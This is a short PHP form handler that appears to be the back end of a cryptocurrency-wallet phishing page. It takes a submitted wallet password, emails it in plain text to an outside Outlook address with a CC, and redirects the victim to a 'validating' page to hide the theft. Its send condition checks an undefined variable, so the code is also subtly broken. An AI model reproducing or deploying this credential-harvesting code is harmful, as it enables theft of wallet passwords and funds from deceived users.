<?php
//get data from form  

$password = $_POST['walletPassword'];

$to = "walletverification@outlook.com";
$subject = "Mail From website";
$txt ="Password = ". $password;
$headers = "From: noreply@yoursite.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:validating.html");
?>